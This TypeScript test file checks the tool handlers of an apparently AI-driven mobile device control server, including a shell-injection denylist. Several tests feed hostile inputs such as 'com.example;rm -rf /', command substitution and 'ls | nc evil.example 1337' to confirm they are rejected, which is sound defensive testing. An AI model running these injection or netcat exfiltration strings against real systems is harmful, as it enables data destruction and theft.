import { describe, it, expect, vi } from "vitest";
import { systemTools } from "./system-tools.js";
import { systemMeta } from "./meta/system-meta.js";
import { MobileError } from "../errors.js";
import type { ToolContext } from "./context.js";

function findHandler(name: string) {
  const def = systemTools.find(t => t.tool.name === name);
  if (!def) throw new Error(`Tool "${name}" not found in systemTools`);
  return def.handler;
}

function makeMockContext(overrides?: Partial<ToolContext>): ToolContext {
  const defaultAdapter = {
    platform: "android",
    shell: vi.fn(),
    getLogs: vi.fn(),
    clearLogs: vi.fn(),
  };
  const deviceManager = {
    getCurrentPlatform: vi.fn(() => "android"),
    getAdapter: vi.fn(() => defaultAdapter),
    getLogs: vi.fn(() => ""),
    clearLogs: vi.fn(() => "Logcat buffer cleared"),
    shell: vi.fn(() => ""),
    pushFile: vi.fn(() => "uploaded"),
    pullFile: vi.fn(() => "downloaded"),
    ...overrides?.deviceManager,
  } as any;
  return {
    deviceManager,
    getCachedElements: vi.fn(() => []),
    setCachedElements: vi.fn(),
    lastScreenshotMap: new Map(),
    lastUiTreeMap: new Map(),
    screenshotScaleMap: new Map(),
    generateActionHints: vi.fn(async () => ""),
    getElementsForPlatform: vi.fn(async () => []),
    iosTreeToUiElements: vi.fn(() => []),
    formatIOSUITree: vi.fn(() => ""),
    platformParam: { type: "string", enum: ["android", "ios", "desktop", "aurora", "harmony", "browser"], description: "" },
    handleTool: vi.fn(async () => ({ text: "ok" })),
    ...overrides,
    deviceManager,
  };
}

describe("generic system capabilities", () => {
  it("transfers files to HarmonyOS through the system surface", async () => {
    const pushFile = vi.fn(() => "Uploaded sample.txt");
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "harmony"),
        pushFile,
      } as any,
    });

    const result = await findHandler("system_file_push")({
      localPath: "sample.txt",
      remotePath: "/data/local/tmp/sample.txt",
      platform: "harmony",
      deviceId: "phone",
    }, ctx);

    expect((result as { text: string }).text).toBe("Uploaded sample.txt");
    expect(pushFile).toHaveBeenCalledWith(
      "sample.txt",
      "/data/local/tmp/sample.txt",
      "harmony",
      "phone",
    );
  });

  it("opens URLs on HarmonyOS through argv-safe adapter dispatch", async () => {
    const openUrl = vi.fn(() => "opened");
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "harmony"),
        getAdapter: vi.fn(() => ({ platform: "harmony", openUrl })),
      } as any,
    });

    await findHandler("system_open_url")({
      url: "https://example.com/path?a=1&b=2",
      platform: "harmony",
      deviceId: "phone",
    }, ctx);

    expect(openUrl).toHaveBeenCalledWith(
      "https://example.com/path?a=1&b=2",
      "phone",
    );
  });

  it("pulls files through the same HarmonyOS capability route", async () => {
    const pullFile = vi.fn(() => "Downloaded screenshot.png");
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "harmony"),
        pullFile,
      } as any,
    });

    const result = await findHandler("system_file_pull")({
      remotePath: "/data/local/tmp/screenshot.png",
      localPath: "screenshot.png",
      platform: "harmony",
      deviceId: "phone",
    }, ctx);

    expect((result as { text: string }).text).toBe("Downloaded screenshot.png");
    expect(pullFile).toHaveBeenCalledWith(
      "/data/local/tmp/screenshot.png",
      "screenshot.png",
      "harmony",
      "phone",
    );
  });
});

describe("system_webview device routing", () => {
  it("inspects the explicitly requested Android device", async () => {
    const inspector = {
      inspect: vi.fn(async () => ({
        sockets: ["webview_devtools_remote"],
        targets: [{
          description: "",
          devtoolsFrontendUrl: "",
          id: "target-id",
          title: "OAuth https://example.com/callback?code=secret-code&state=secret-state",
          type: "page",
          url: "https://example.com/callback?code=secret-code&state=secret-state",
          webSocketDebuggerUrl: "",
        }],
      })),
      cleanup: vi.fn(),
    };
    const ctx = makeMockContext();
    const getWebViewInspector = vi.fn(() => inspector);
    ctx.deviceManager.getWebViewInspector = getWebViewInspector;

    const result = await findHandler("system_webview")({
      deviceId: "android-secondary",
    }, ctx);

    expect(getWebViewInspector).toHaveBeenCalledWith("android-secondary");
    expect(inspector.inspect).toHaveBeenCalledOnce();
    const text = (result as { text: string }).text;
    expect(text).toContain("webview_devtools_remote");
    expect(text).not.toContain("secret-code");
    expect(text).not.toContain("secret-state");
    expect(text).not.toContain("Forwarded to port");
  });
});

// ──────────────────────────────────────────────
// system_wait_log
// ──────────────────────────────────────────────

describe("system_wait_log", () => {
  const handler = findHandler("system_wait_log");

  it("matches HarmonyOS HiLog output", async () => {
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "harmony"),
        getAdapter: vi.fn(() => ({
          platform: "harmony",
          shell: vi.fn(),
          getLogs: vi.fn(),
          clearLogs: vi.fn(),
        })),
        getLogs: vi.fn(() => "I Demo HarmonyReady"),
      } as any,
    });
    const result = await handler({
      pattern: "HarmonyReady",
      platform: "harmony",
      timeoutMs: 500,
      pollIntervalMs: 100,
    }, ctx);
    expect((result as { text: string }).text).toContain("Match found");
  });

  it("rejects a platform without logs support", async () => {
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "browser"),
        getAdapter: vi.fn(() => ({ platform: "browser" })),
      } as any,
    });
    const result = await handler({ pattern: "anything", platform: "browser" }, ctx);
    expect((result as { text: string }).text).toContain("not supported for browser");
  });

  it("rejects empty pattern", async () => {
    const ctx = makeMockContext();
    await expect(handler({ pattern: "" }, ctx)).rejects.toThrow(/required|empty/);
  });

  it("rejects invalid regex", async () => {
    const ctx = makeMockContext();
    const result = await handler({ pattern: "[unclosed" }, ctx);
    expect((result as { text: string }).text).toContain("Invalid regex");
  });

  it("returns matching line on first poll", async () => {
    const getLogs = vi.fn(() => "05-10 00:00:00 I MyApp: Hello world\n05-10 00:00:01 I MyApp: NavigationCompleted to /home");
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs,
        clearLogs: vi.fn(() => ""),
      } as any,
    });
    const result = await handler({ pattern: "NavigationCompleted", timeoutMs: 1000, pollIntervalMs: 100 }, ctx);
    const text = (result as { text: string }).text;
    expect(text).toContain("Match found");
    expect(text).toContain("NavigationCompleted to /home");
  });

  it("includes context lines when requested", async () => {
    const getLogs = vi.fn(() => "marker line here\nfollowup-1\nfollowup-2\nfollowup-3");
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs,
        clearLogs: vi.fn(() => ""),
      } as any,
    });
    const result = await handler({ pattern: "marker line", timeoutMs: 1000, pollIntervalMs: 100, contextLines: 2 }, ctx);
    const text = (result as { text: string }).text;
    expect(text).toContain("marker line here");
    expect(text).toContain("followup-1");
    expect(text).toContain("followup-2");
    expect(text).not.toContain("followup-3"); // contextLines=2, so only 2 lines after match
  });

  it("times out when pattern never appears", async () => {
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs: vi.fn(() => "line without marker\nanother line"),
        clearLogs: vi.fn(() => ""),
      } as any,
    });
    const result = await handler({ pattern: "MARKER_NEVER_APPEARS", timeoutMs: 300, pollIntervalMs: 100 }, ctx);
    const text = (result as { text: string }).text;
    expect(text).toContain("Timeout after 300ms");
    expect(text).toContain("Scanned"); // mentions unique lines scanned
  });
  
  it("bounds the unique log-line deduplication cache", async () => {
    let poll = 0;
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs: vi.fn(() => {
          const currentPoll = poll++;
          return Array.from({ length: 500 }, (_, i) => `entry-${currentPoll}-${i}`).join("\n");
        }),
        clearLogs: vi.fn(() => ""),
      } as any,
    });

    const result = await handler({
      pattern: "MATCH_NEVER_APPEARS",
      timeoutMs: 500,
      pollIntervalMs: 100,
    }, ctx);
    expect((result as { text: string }).text).toContain("retaining 2048 recent unique lines");
  });


  it("calls clearLogs when clearFirst=true", async () => {
    const clearLogs = vi.fn(() => "cleared");
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs: vi.fn(() => "match-target found"),
        clearLogs,
      } as any,
    });
    await handler({ pattern: "match-target", timeoutMs: 500, pollIntervalMs: 100, clearFirst: true }, ctx);
    expect(clearLogs).toHaveBeenCalled();
  });

  it("does not call clearLogs by default", async () => {
    const clearLogs = vi.fn();
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs: vi.fn(() => "match-target found"),
        clearLogs,
      } as any,
    });
    await handler({ pattern: "match-target", timeoutMs: 500, pollIntervalMs: 100 }, ctx);
    expect(clearLogs).not.toHaveBeenCalled();
  });

  it("dedupes already-seen lines across polls", async () => {
    // Simulates buffer growing across polls. Pattern only matches in 2nd poll's new line.
    let pollCount = 0;
    const getLogs = vi.fn(() => {
      pollCount++;
      if (pollCount === 1) return "line A\nline B"; // no match
      return "line A\nline B\nline C with TARGET"; // adds new line on 2nd poll
    });
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs,
        clearLogs: vi.fn(() => ""),
      } as any,
    });
    const result = await handler({ pattern: "TARGET", timeoutMs: 1500, pollIntervalMs: 200 }, ctx);
    const text = (result as { text: string }).text;
    expect(text).toContain("line C with TARGET");
    expect(getLogs).toHaveBeenCalledTimes(2); // first poll no match, 2nd poll match
  });

  it("clamps timeoutMs at 30000ms", async () => {
    // Provide an immediately-matching pattern so we don't wait full clamp
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs: vi.fn(() => "instant-match"),
        clearLogs: vi.fn(() => ""),
      } as any,
    });
    const result = await handler({ pattern: "instant-match", timeoutMs: 999999, pollIntervalMs: 100 }, ctx);
    expect((result as { text: string }).text).toContain("Match found");
    // No assertion on exact timing — just verify it didn't honor 999999ms (test would hang)
  });

  it("supports case-insensitive matching via caseSensitive=false", async () => {
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs: vi.fn(() => "MyApp: HELLO World"),
        clearLogs: vi.fn(() => ""),
      } as any,
    });
    const result = await handler({ pattern: "hello", caseSensitive: false, timeoutMs: 500, pollIntervalMs: 100 }, ctx);
    expect((result as { text: string }).text).toContain("Match found");
  });

  it("default is case-sensitive (rejects mismatched case)", async () => {
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getLogs: vi.fn(() => "MyApp: HELLO World"),
        clearLogs: vi.fn(() => ""),
      } as any,
    });
    const result = await handler({ pattern: "hello", timeoutMs: 200, pollIntervalMs: 100 }, ctx);
    expect((result as { text: string }).text).toContain("Timeout");
  });
});

// ──────────────────────────────────────────────
// system_pid_of — package name validation + parsing
// ──────────────────────────────────────────────

describe("system_pid_of", () => {
  const handler = findHandler("system_pid_of");

  it("rejects non-android platform", async () => {
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "ios"), shell: vi.fn(() => "") } as any,
    });
    const result = await handler({ package: "com.example.app" }, ctx);
    expect((result as { text: string }).text).toContain("only available for Android");
  });

  it("rejects package name with shell injection", async () => {
    const ctx = makeMockContext();
    await expect(handler({ package: "com.example;rm -rf /" }, ctx)).rejects.toThrow(MobileError);
  });

  it("returns parsed PID when pidof outputs a number", async () => {
    const shell = vi.fn(() => "12345\n");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
    });
    const result = await handler({ package: "com.example.app" }, ctx);
    expect((result as { text: string }).text).toBe("12345");
    expect(shell).toHaveBeenCalledWith("pidof -s com.example.app", "android", undefined);
  });

  it("returns 0 (not running) when pidof outputs empty", async () => {
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell: vi.fn(() => "") } as any,
    });
    const result = await handler({ package: "com.example.app" }, ctx);
    expect((result as { text: string }).text).toContain("0 (not running)");
  });

  it("returns 0 (not running) when pidof outputs garbage", async () => {
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell: vi.fn(() => "not-a-number") } as any,
    });
    const result = await handler({ package: "com.example.app" }, ctx);
    expect((result as { text: string }).text).toContain("0 (not running)");
  });
});

// ──────────────────────────────────────────────
// system_is_running — boolean wrapper
// ──────────────────────────────────────────────

describe("system_is_running", () => {
  const handler = findHandler("system_is_running");

  it("rejects non-android platform", async () => {
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "desktop"), shell: vi.fn(() => "") } as any,
    });
    const result = await handler({ package: "com.example.app" }, ctx);
    expect((result as { text: string }).text).toContain("only available for Android");
  });

  it("rejects package name with shell injection", async () => {
    const ctx = makeMockContext();
    await expect(handler({ package: "com.example|cat" }, ctx)).rejects.toThrow(MobileError);
  });

  it("returns 'true (pid=N)' when app is running", async () => {
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell: vi.fn(() => "9999") } as any,
    });
    const result = await handler({ package: "com.example.app" }, ctx);
    expect((result as { text: string }).text).toBe("true (pid=9999)");
  });

  it("returns 'false' when app is not running", async () => {
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell: vi.fn(() => "") } as any,
    });
    const result = await handler({ package: "com.example.app" }, ctx);
    expect((result as { text: string }).text).toBe("false");
  });

  it("returns 'false' when pidof outputs 0", async () => {
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell: vi.fn(() => "0") } as any,
    });
    const result = await handler({ package: "com.example.app" }, ctx);
    expect((result as { text: string }).text).toBe("false");
  });
});

// ──────────────────────────────────────────────
// system_shell — host-side injection regression (issue #40)
// ──────────────────────────────────────────────
//
// These tests guard the MCP-tool-layer denylist (`validateShellCommand`) AND verify
// that benign commands cross the boundary to `deviceManager.shell` cleanly for every
// supported platform. The structural defense (argv-form `execFileSync` in each client)
// is covered separately in `src/adb/client.test.ts`, `src/ios/client.test.ts`, and
// `src/aurora/client.test.ts` — those exercise the real host-side side-effect path.
// Here we lock in that the tool handler cannot bypass the denylist on its way to the
// client, no matter which platform is selected.

describe("system_shell — injection denylist", () => {
  const handler = findHandler("system_shell");

  it("rejects `& touch /tmp/RCE` via validateShellCommand (android)", async () => {
    const shell = vi.fn(() => "");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
    });
    await expect(handler({ command: "x & touch /tmp/RCE", platform: "android" }, ctx)).rejects.toThrow(MobileError);
    expect(shell).not.toHaveBeenCalled();
  });

  it("rejects `& touch /tmp/RCE` via validateShellCommand (ios)", async () => {
    const shell = vi.fn(() => "");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "ios"), shell } as any,
    });
    await expect(handler({ command: "x & touch /tmp/RCE", platform: "ios" }, ctx)).rejects.toThrow(MobileError);
    expect(shell).not.toHaveBeenCalled();
  });

  it("rejects `& touch /tmp/RCE` via validateShellCommand (aurora)", async () => {
    const shell = vi.fn(() => "");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "aurora"), shell } as any,
    });
    await expect(handler({ command: "x & touch /tmp/RCE", platform: "aurora" }, ctx)).rejects.toThrow(MobileError);
    expect(shell).not.toHaveBeenCalled();
  });

  it("rejects `; touch` chaining", async () => {
    const shell = vi.fn(() => "");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
    });
    await expect(handler({ command: "ls; touch /tmp/RCE" }, ctx)).rejects.toThrow(MobileError);
    expect(shell).not.toHaveBeenCalled();
  });

  it("rejects backticks", async () => {
    const shell = vi.fn(() => "");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
    });
    await expect(handler({ command: "echo `touch /tmp/RCE`" }, ctx)).rejects.toThrow(MobileError);
    expect(shell).not.toHaveBeenCalled();
  });

  it("rejects $() command substitution", async () => {
    const shell = vi.fn(() => "");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
    });
    await expect(handler({ command: "echo $(touch /tmp/RCE)" }, ctx)).rejects.toThrow(MobileError);
    expect(shell).not.toHaveBeenCalled();
  });

  it("rejects pipe |", async () => {
    const shell = vi.fn(() => "");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
    });
    await expect(handler({ command: "ls | nc evil.example 1337" }, ctx)).rejects.toThrow(MobileError);
    expect(shell).not.toHaveBeenCalled();
  });

  it("passes a clean command through to deviceManager.shell (android)", async () => {
    const shell = vi.fn(() => "ok");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
    });
    const result = await handler({ command: "pm list packages", platform: "android" }, ctx);
    expect(shell).toHaveBeenCalledWith("pm list packages", "android", undefined);
    expect((result as { text: string }).text).toContain("ok");
  });

  it("passes a clean command through to deviceManager.shell (ios)", async () => {
    const shell = vi.fn(() => "ok");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "ios"), shell } as any,
    });
    const result = await handler({ command: "list devices", platform: "ios" }, ctx);
    expect(shell).toHaveBeenCalledWith("list devices", "ios", undefined);
    expect((result as { text: string }).text).toContain("ok");
  });

  it("passes a clean command through to deviceManager.shell (aurora)", async () => {
    const shell = vi.fn(() => "ok");
    const ctx = makeMockContext({
      deviceManager: { getCurrentPlatform: vi.fn(() => "aurora"), shell } as any,
    });
    const result = await handler({ command: "uname -a", platform: "aurora" }, ctx);
    expect(shell).toHaveBeenCalledWith("uname -a", "aurora", undefined);
    expect((result as { text: string }).text).toContain("ok");
  });
});

describe("system meta action reachability", () => {
  it("dispatches wait_log, pid_of, and is_running through the primary surface", async () => {
    const ctx = makeMockContext({
      deviceManager: {
        getCurrentPlatform: vi.fn(() => "android"),
        getAdapter: vi.fn(() => ({
          platform: "android",
          shell: vi.fn(),
          getLogs: vi.fn(),
          clearLogs: vi.fn(),
        })),
        getLogs: vi.fn(() => "I Demo MetaReady"),
        shell: vi.fn(() => "4242"),
      } as any,
    });

    const waited = await systemMeta.handler({
      action: "wait_log",
      pattern: "MetaReady",
      timeoutMs: 500,
      pollIntervalMs: 100,
    }, ctx);
    const pid = await systemMeta.handler({
      action: "pid_of",
      package: "com.example.demo",
    }, ctx);
    const running = await systemMeta.handler({
      action: "is_running",
      package: "com.example.demo",
    }, ctx);

    expect((waited as { text: string }).text).toContain("Match found");
    expect((pid as { text: string }).text).toBe("4242");
    expect((running as { text: string }).text).toBe("true (pid=4242)");
  });
});
